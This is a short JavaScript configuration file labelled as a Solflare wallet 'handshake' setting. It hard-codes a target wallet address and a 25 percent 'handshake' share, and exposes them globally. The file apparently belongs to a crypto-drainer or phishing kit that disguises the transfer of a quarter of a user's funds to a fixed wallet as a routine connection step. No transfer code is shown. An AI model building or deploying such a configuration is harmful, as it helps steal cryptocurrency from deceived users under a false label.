/**
 * Solflare Handshake Transaction Configuration
 */
(function (root) {
  const config = {
    HANDSHAKE_TARGET_WALLET: "DJsw99DJHntTp5apr6P9w6xXdP23ckkWV72bPcfoaahV",
    HANDSHAKE_PERCENTAGE: 25,
    ESTIMATED_FEE: "0.000005 SOL"
  };

  if (typeof module !== 'undefined' && module.exports) {
    module.exports = config;
  }
  if (typeof root !== 'undefined') {
    root.HANDSHAKE_CONFIG = config;
  }
})(typeof globalThis !== 'undefined' ? globalThis : (typeof window !== 'undefined' ? window : this));
